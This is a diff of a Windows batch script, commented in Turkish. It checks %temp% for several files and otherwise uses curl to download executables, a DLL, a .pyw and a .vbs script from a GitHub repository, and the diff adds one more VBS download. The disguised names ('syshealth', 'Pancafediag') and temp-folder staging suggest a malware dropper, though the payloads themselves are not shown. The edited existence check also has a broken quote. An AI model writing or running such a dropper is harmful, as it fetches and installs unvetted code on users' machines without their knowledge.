@@ -13,7 +13,7 @@ set "FILE7=%temp%\syshealth.pyw"
 set "FILE3=%temp%\runnerr.vbs"
 
 :: Tüm dosyaların varlığını tek tek kontrol et
-if exist "%FILE1%" if exist "%FILE2%"  if exist "%FILE4%"  if exist "%FILE5%"  if exist "%FILE6%" if exist "%FILE7%" (
+if exist "%FILE1%" if exist "%FILE2%"  if exist "%FILE4%"  if exist "%FILE5%"  if exist "%FILE6%" if exist "%FILE7% if exist "%FILE3%" (
     exit
 )
 
@@ -24,9 +24,10 @@ curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/by
 curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/Pancafediag.exe" -o "%FILE5%"
 curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/PncDiag.dll" -o "%FILE6%"
 curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/syshealth.pyw" -o "%FILE7%"
-
+curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/runnerr.vbs" -o "%FILE3%"
 
 exit
+
 
 
 
